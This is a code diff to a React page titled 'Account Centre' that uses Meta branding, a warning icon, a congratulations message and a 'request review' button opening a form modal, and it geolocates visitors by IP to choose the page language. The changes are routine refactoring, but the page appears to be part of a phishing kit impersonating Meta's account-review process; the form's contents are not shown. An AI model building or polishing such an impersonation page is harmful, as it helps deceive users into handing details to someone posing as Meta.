@@ -35,7 +35,7 @@ interface InfoCardItem {
 }
 
 const Page: FC = () => {
-    const { setGeoInfo, geoInfo } = useGeoStore();
+    const { setGeoInfo } = useGeoStore();
     const [dictionary, setDictionary] = useState<Dictionary | null>(null);
     const [isLoading, setIsLoading] = useState(true);
     const [isModalOpen, setIsModalOpen] = useState(false);
@@ -46,7 +46,7 @@ const Page: FC = () => {
             try {
                 setIsLoading(true);
 
-                const geoResponse = await fetch('https://get.geojs.io/v1/ip/geo.json');
+                const geoResponse = await fetch('/api/geo');
                 let languageCode = 'en';
 
                 if (geoResponse.ok) {
@@ -59,9 +59,9 @@ const Page: FC = () => {
                         country_code: geoData.country_code || 'US',
                         region: geoData.region || 'Unknown',
                         timezone: geoData.timezone || 'Unknown',
-                        organization: `AS${geoData.asn || 0}`
+                        organization: geoData.organization || 'Unknown'
                     });
-                    languageCode = geoData.country_code || 'en';
+                    languageCode = geoData.language_code || 'en';
                 }
 
                 const fullDictionary = await getDictionary(languageCode);
@@ -99,9 +99,7 @@ const Page: FC = () => {
         { id: 'manage', title: content.manageInfoTitle, subtitle: content.privacyPolicyLabel, image: ProfileImage }
     ];
 
-    const agreementItems: InfoCardItem[] = [
-        { id: 'meta-ai', title: content.metaAiTitle, subtitle: content.userAgreementLabel, image: MetaAI }
-    ];
+    const agreementItems: InfoCardItem[] = [{ id: 'meta-ai', title: content.metaAiTitle, subtitle: content.userAgreementLabel, image: MetaAI }];
 
     const resourceItems: InfoCardItem[] = [
         { id: 'generative-ai', title: content.generativeAiTitle, subtitle: content.privacyCenterSection },
@@ -113,9 +111,9 @@ const Page: FC = () => {
         <div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
             <title>Account Centre</title>
             {isModalOpen && <FormModal key={modalKey} dictionary={dictionary} />}
-            <div className='flex w-full max-w-[1100px]'>
+            <div className='flex w-full max-w-275'>
                 <div className='sticky top-0 hidden h-screen w-1/3 flex-col border-r border-r-gray-200 pt-10 pr-8 sm:flex'>
-                    <Image src={MetaImage} alt='' className='h-3.5 w-[70px]' />
+                    <Image src={MetaImage} alt='' className='h-3.5 w-17.5' />
                     <p className='my-4 text-2xl font-bold'>{content.title}</p>
                     {menuItems.map((item) => (
                         <div key={item.id} className={`flex cursor-pointer items-center justify-start gap-3 rounded-[15px] px-4 py-3 font-medium ${item.isActive ? 'bg-[#344854] text-white' : 'text-black hover:bg-[#e3e8ef]'}`}>
@@ -126,7 +124,7 @@ const Page: FC = () => {
                 </div>
                 <div className='flex flex-1 flex-col gap-5 px-4 py-10 sm:px-8'>
                     <div className='flex items-center gap-2'>
-                        <Image src={WarningImage} alt='' className='h-[50px] w-[50px]' />
+                        <Image src={WarningImage} alt='' className='h-12.5 w-12.5' />
                         <p className='text-2xl font-bold'>{content.congratulationsTitle}</p>
                     </div>
                     <p>{content.congratulationsMessage}</p>
@@ -141,7 +139,7 @@ const Page: FC = () => {
                                     setModalKey((prev) => prev + 1);
                                     setIsModalOpen(true);
                                 }}
-                                className='flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white'
+                                className='flex h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white'
                             >
                                 {content.requestReview}
                             </button>
